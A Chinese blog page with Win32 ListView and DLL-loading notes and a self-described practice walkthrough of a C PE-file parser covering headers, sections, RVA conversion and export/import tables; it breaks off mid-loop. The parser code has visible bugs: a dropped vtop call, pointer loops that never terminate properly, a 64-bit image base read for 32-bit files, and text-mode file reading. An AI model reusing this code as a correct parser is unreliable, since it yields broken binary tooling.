TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InsertItem</span><span class="params">(HWND hwnd, <span class="keyword">int</span> id, <span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LVITEMW lvItem = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	lvItem.mask = LVIF_TEXT;</span><br><span class="line">	lvItem.iItem = item;</span><br><span class="line">	lvItem.pszText = (LPWSTR)<span class="string">L&quot;&quot;</span>;</span><br><span class="line">	<span class="built_in">SendDlgItemMessageW</span>(hwnd, id, LVM_INSERTITEMW, <span class="number">0</span>, (LPARAM)&amp;lvItem);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetListItemText</span><span class="params">(HWND hwnd, <span class="keyword">int</span> id, <span class="keyword">int</span> item, <span class="keyword">int</span> subItem, LPWSTR name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LVITEMW lvItem = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	lvItem.mask = LVIF_TEXT;</span><br><span class="line">	lvItem.iItem = item;</span><br><span class="line">	lvItem.iSubItem = subItem;</span><br><span class="line">	lvItem.pszText = name;</span><br><span class="line">	<span class="built_in">SendDlgItemMessageW</span>(hwnd, id, LVM_SETITEMTEXTW, item, (LPARAM)&amp;lvItem);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>添加样式：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sendDlgItemMessageW</span>(hwnd, id, LVM_SETEXTENDEDLISTVIEWSTYLE, <span class="number">0</span>, style)</span><br></pre></td></tr></table></figure>

<p>常用style有：LVS_EX_FULLROWSELECT ， 全行选中；</p>
<p>​            LVS_EX_GRIDLINES    ,  添加网格；</p>
<p>点击其成员触发notify信息，其有 NMHDR 结构：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">nmhdr</span> &#123;</span></span><br><span class="line">  HWND hwndFrom;		<span class="comment">//发起信息句柄	</span></span><br><span class="line">  UINT idFrom;			<span class="comment">//id</span></span><br><span class="line">  UINT code;			<span class="comment">//操作码</span></span><br><span class="line">&#125; NMHDR;</span><br></pre></td></tr></table></figure>

<p>如果确认控件是list，则结构体为 NMLISTVIEW ，为 NMHDR 的继承；</p>
<p>捕获点击消息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_NOTIFY:</span><br><span class="line">&#123;</span><br><span class="line">    NMHDR* pnmHeader = (NMHDR*)lParam;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(pnmHeader-&gt;code)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> NM_CLICK:</span><br><span class="line">            &#123;</span><br><span class="line">                ...</span><br><span class="line">               	<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种捕获类似于下拉表；</p>
<p>获取dll文件函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hModule = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;./mydll.dll&quot;</span>);</span><br><span class="line"><span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;func_name&quot;</span>);	<span class="comment">//返回一个函数指针</span></span><br><span class="line"><span class="built_in">FreeLibrary</span>(hModule);</span><br></pre></td></tr></table></figure>



<h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><p>搓了个CPP的类粘合着窗口化编程使用做了个小程序，提取码 <code>a333</code> ;</p>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GSH23Z8ROKBB35PUa_Swxw">原神伤害云计算</a>；</p>
</div></div><a class="button-hover more" href="/SecondBC/2022/12/04/Windows%E7%BC%96%E7%A8%8B/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/11/12/PE%E7%AE%80%E5%8D%95%E8%A7%A3%E6%9E%90%E5%99%A8/">PE简单解析器</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2023-07-17</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Lab/">Lab</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Bin/">Bin</a></div></div><div class="post-content"><div class="main-content content"><p>了解PE的结构：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/31967907">https://zhuanlan.zhihu.com/p/31967907</a>  </p>
<p>作为练手的记录, 学习性不是很强；</p>
<p>记录一些术语：</p>
<p>魔术码 = 幻码 = 特征码；</p>
<p>结构体中单个内容 = 字段；</p>
<p>rva = 内存中偏移；</p>
<p>foa = 文件中偏移；</p>
<p>静态 = 文件中的处理；</p>
<p>动态 = 内存中的处理；</p>
<p>IAT = 导入地址表 = import address table</p>
<p>INT = 导入名称表 = import name table</p>
<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>定义一些简单的类型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> UINT8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> UINT16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> UINT32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> UINT64;</span><br></pre></td></tr></table></figure>

<p>解析一个PE文件首先需要读取二进制内容；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取文件长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_file_size</span><span class="params">(FILE* fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">	<span class="keyword">int</span> size = <span class="built_in">ftell</span>(fp);</span><br><span class="line">	<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读文件</span></span><br><span class="line"><span class="keyword">char</span> filename[] = <span class="string">&quot;a.exe&quot;</span>;</span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fsize = <span class="built_in">get_file_size</span>(fp);</span><br><span class="line"></span><br><span class="line">UINT8* fbuffer = (UINT8*)<span class="built_in">malloc</span>(fsize);</span><br><span class="line"><span class="built_in">fread</span>(fbuffer, <span class="number">1</span>, fsize, fp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br></pre></td></tr></table></figure>

<p>利用如上代码便可以将 a.exe 的内容复制给 fbuffer 缓冲区，之后在这个缓冲区上进行操作；</p>
<h2 id="解析DOS头"><a href="#解析DOS头" class="headerlink" title="解析DOS头"></a>解析DOS头</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取dos头</span></span><br><span class="line">UINT8* p_dos_header = fbuffer;</span><br><span class="line"></span><br><span class="line">UINT16 dos_magic = (UINT16) * ((UINT16*)p_dos_header);</span><br><span class="line">UINT32 pe_offset;</span><br><span class="line"><span class="keyword">if</span> (dos_magic != <span class="number">0x5a4d</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s it&#x27;s not a valid PE file.\n&quot;</span>, filename);</span><br><span class="line">    <span class="built_in">free</span>(fbuffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    pe_offset = (UINT32) * (UINT32*)(p_dos_header + <span class="number">0x40</span> - <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里只捕获了两个重要的内容，也就是 dos magic 和 pe offset，第一个能判断这个文件是否为一个PE文件，第二能由此找到PE头，也就是常说的NT头；</p>
<h2 id="解析PE头"><a href="#解析PE头" class="headerlink" title="解析PE头"></a>解析PE头</h2><p>也称NT头；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取pe头</span></span><br><span class="line">UINT8* p_pe_header = (p_dos_header + pe_offset);</span><br><span class="line"></span><br><span class="line">UINT32 pe_magic = (UINT32) * ((UINT32*)p_pe_header);</span><br><span class="line"><span class="keyword">if</span> (pe_magic != <span class="number">0x4550</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s it&#x27;s pe magic number wrong: %x\n&quot;</span>, filename, pe_magic);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据dos头里获得的pe偏移，利用dos头指针找到pe头，由此给出pe魔术码；</p>
<h3 id="解析file头"><a href="#解析file头" class="headerlink" title="解析file头"></a>解析file头</h3><p>file头，可称为标准PE头；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取file头</span></span><br><span class="line">UINT8* p_file_header = p_pe_header + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">UINT16 machine_num = (UINT16) * ((UINT16*)p_file_header);</span><br><span class="line">UINT16 number_of_sections = (UINT16) * (UINT16*)(p_file_header + <span class="number">2</span>);</span><br><span class="line">UINT16 size_of_optional_header = (UINT16) * (UINT16*)(p_file_header + <span class="number">16</span>);</span><br><span class="line">UINT16 file_characteristics = (UINT16) * (UINT16*)(p_file_header + <span class="number">18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s machine number is %xh\n&quot;</span>, machine_num);</span><br></pre></td></tr></table></figure>

<p>根据pe头能找到file头，给出其中4个重要内容，由上往下依次是：</p>
<ol>
<li>CPU架构码，代表能在什么架构上运行，0值默认都行；</li>
<li>节区数量，记录节的总数；</li>
<li>可选头大小，默认e0h是32位, f0h是64位；</li>
<li>特性，每位都代表一个内容，具体是什么用 010 editor 查看；</li>
</ol>
<p>之后便给出CPU架构码；</p>
<h3 id="解析可选头"><a href="#解析可选头" class="headerlink" title="解析可选头"></a>解析可选头</h3><p>optional头，也称可选PE头；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取可选头</span></span><br><span class="line">UINT8* p_optional_header = p_file_header + <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">UINT16 optional_magic = (UINT16) * ((UINT16*)p_optional_header);</span><br><span class="line">UINT32 oep_offset = (UINT32) * (UINT32*)(p_optional_header + <span class="number">16</span>);</span><br><span class="line">UINT64 image_base = (UINT64) * (UINT64*)(p_optional_header + <span class="number">24</span>);</span><br><span class="line">UINT32 section_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">32</span>);</span><br><span class="line">UINT32 file_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">36</span>);</span><br><span class="line">UINT32 size_of_image = (UINT32) * (UINT32*)(p_optional_header + <span class="number">56</span>);</span><br><span class="line">UINT32 size_of_headers = (UINT32) * (UINT32*)(p_optional_header + <span class="number">60</span>);</span><br><span class="line">UINT16 dll_characteristics = (UINT16) * (UINT16*)(p_optional_header + <span class="number">70</span>);</span><br><span class="line"><span class="keyword">if</span> (size_of_optional_header == <span class="number">0xe0</span> &amp;&amp; optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;standard 32bit mode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;32bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(size_of_optional_header == <span class="number">0xf0</span> &amp;&amp; optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;standard 64bit mode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;64bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OEP is at 0x%x\n&quot;</span>, image_base + oep_offset);</span><br></pre></td></tr></table></figure>

<p>根据PE头能找到可选头，给出其中8个重要内容，从下往上依次是：</p>
<ol>
<li>可选魔术码，标准是32位还是64位，分别用10bh和20bh代表；</li>
<li>oep偏移，相对加载内存地址的程序入口地址的偏移，配合image_base食用；</li>
<li>内存地址实际加载处，注意，如果开了 随机基址（动态基址）则无用，动态基址在第8个里可查看是否开启；</li>
<li>内存中对齐，默认1000h；</li>
<li>文件中对齐，默认200h；</li>
<li>内存中整个文件大小；</li>
<li>文件中所有头部大小，包括 dos头，dos存根，nt头，节区头；</li>
<li>类似之前的特性，也是每一位代表一个内容，具体用 010 editor 查看；</li>
</ol>
<p>之后给出位模式和oep地址；</p>
<h2 id="解析节区头"><a href="#解析节区头" class="headerlink" title="解析节区头"></a>解析节区头</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取节区头</span></span><br><span class="line">UINT8* p_section_header = p_optional_header + size_of_optional_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> section_name[<span class="number">9</span>];</span><br><span class="line">UINT32 VA;</span><br><span class="line">UINT32 PA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        section_name[j] = p_section_header[j];</span><br><span class="line">    &#125;</span><br><span class="line">    section_name[<span class="number">8</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">    PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">    VA += image_base;</span><br><span class="line">    PA += image_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-40s VA 0x%016jx \n                                         PA 0x%016jx \n--------------------\n&quot;</span>, section_name, VA, PA);</span><br><span class="line">    p_section_header += <span class="number">0x28</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用可选头和其大小，跳转到节区头，并利用文件头中获取的节区数量进行循环打印名称，并打印其中每个节区的内存中（VA）地址和文件中（PA）地址；</p>
<h3 id="关于对齐和偏移"><a href="#关于对齐和偏移" class="headerlink" title="关于对齐和偏移"></a>关于对齐和偏移</h3><p>偏移都是相对image base而言；</p>
<p>因为在文件中和内存中有不同的对齐，所以才有不同的偏移值，而对齐是相对于区段而言，区段与区段之间，头与区段之间会填充对齐；</p>
<p>当知晓一个<strong>地址的VA偏移</strong>，且知晓这个<strong>地址属于哪个区段</strong>，便可得出这个<strong>地址的PA偏移</strong>；</p>
<p>why？</p>
<p>因为区段内不存在对齐改变偏移，所以有等式：地址VA - 区段VA = 区段与地址的距离</p>
<p>​                                   地址PA - 区段PA = 区段与地址的距离</p>
<p>所以有 地址PA = 地址VA - 区段VA + 区段PA；</p>
<p>定义转换函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT32 <span class="title">vtop</span><span class="params">(UINT32 rva, UINT8* p_section_header, UINT16 number_of_sections)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UINT32 VA;</span><br><span class="line">	UINT32 PA;</span><br><span class="line">	UINT32 true_size;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">		PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">		true_size = (UINT32) * (UINT32*)(p_section_header + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((rva &gt;= VA) &amp;&amp; (rva &lt; VA + true_size))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> (rva - VA + PA);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		p_section_header += <span class="number">0x28</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;rva error\n\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当rva存在在一个区段的内部时，也就是if判断，就可以执行转换了，如果没找到，就是错误的rva；</p>
<h2 id="打印导出表"><a href="#打印导出表" class="headerlink" title="打印导出表"></a>打印导出表</h2><p>导出表是可选头最后一个结构体数组的第一个索引来寻找的；</p>
<p>注意：导出表很多内容本质是rva，导出表结构可自行百度；</p>
<p>所以找到特别的结构体数组：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取datadirarray数组</span></span><br><span class="line">UINT32 datadirarray_index = (UINT32) * (UINT32*)(p_section_header - <span class="number">0x84</span>);</span><br><span class="line">UINT8* datadirarray = p_section_header - <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>

<p>因为32位和64位op头长度不同，所以都能用的情况就是用节区头去反着找；</p>
<p>这个数组的每个结构体都只有一个实际的内容，就是记录表或者项目的rva；</p>
<p>之后根据 datadirarray 找到导出表：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取导出表</span></span><br><span class="line"><span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    UINT8* export_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT32 etnamead = (UINT32) * (UINT32*)(export_table + <span class="number">12</span>);</span><br><span class="line">    UINT8* etname = <span class="built_in">vtop</span>(etnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT32 number_of_functions = (UINT32) * (UINT32*)(export_table + <span class="number">20</span>);</span><br><span class="line">    UINT32 number_of_names = (UINT32) * (UINT32*)(export_table + <span class="number">24</span>);</span><br><span class="line">    UINT8* ad_of_funcs = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">28</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT8* ad_of_names = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">32</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT8* ad_of_ordis = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">36</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n\n&quot;</span>, etname);</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_functions; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016jx&quot;</span>, (UINT32) * (UINT32*)(ad_of_funcs + <span class="number">4</span> * i) + image_base);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; number_of_names; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i == (UINT16) * (UINT16*)(ad_of_ordis + <span class="number">2</span> * j))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;                    %3d     %s\n&quot;</span>, i, <span class="built_in">vtop</span>((UINT32) * (UINT32*)(ad_of_names + <span class="number">4</span> * j), p_section_header, number_of_sections) + fbuffer);</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;                            ---\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;no export..\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先需要有 导出表，也就是 datadirarray[0] 有存在的rva，然后利用rva去静态地找到导出表；</p>
<p>之后同样的道理，找到导出表名称，接着是导出函数数，以及有名称的函数数；</p>
<p>然后是三个表：函数地址表，函数序数表，函数名称表；</p>
<p>关系如下：</p>
<p><img src="https://s2.loli.net/2022/11/11/Tm3G7nZBRjDX2yJ.png" alt="func_table"></p>
<p>所以才有打印时的循环操作：</p>
<ol>
<li>首先根据整体数量操作，打印出索引对应地址；</li>
<li>然后进入内层循环，找有名称的函数；</li>
<li>当地址索引和序数表内容相同时，也就是if判断，利用当前序数表索引打印函数名称；</li>
<li>设置的flag位算信号量，打印没名称函数；</li>
</ol>
<h2 id="打印导入表"><a href="#打印导入表" class="headerlink" title="打印导入表"></a>打印导入表</h2><h3 id="关于dll载入"><a href="#关于dll载入" class="headerlink" title="关于dll载入"></a>关于dll载入</h3><p>显式加载时，调用文件会留下函数名，以rva字符串形式保存在文件中；</p>
<p>主文件和dll文件被扔到同一个进程中；</p>
<p>加载到内存时，loadlibrary函数做了 将dll文件的 imagebase 地址赋予到本文件指针，所以<strong>可以操作dll文件的头部</strong>；</p>
<p>可以简单理解 通过dll的导出表 将存放函数名rva的地方改成了对应的函数地址；</p>
<p>由此，dll中的函数被调用；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取导入表</span></span><br><span class="line"><span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    UINT8* import_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    <span class="keyword">while</span> (import_table != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        UINT8* original_first_thunk = import_table;</span><br><span class="line">        UINT32 itnamead = (UINT32) * (UINT32*)(import_table + <span class="number">12</span>);</span><br><span class="line">        UINT8* itname = (itnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Import Table:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, itname);</span><br><span class="line"></span><br><span class="line">        UINT8* name_stru = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(original_first_thunk), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">        <span class="keyword">while</span> (name_stru != <span class="literal">NULL</span>)</span><br><span class="line">        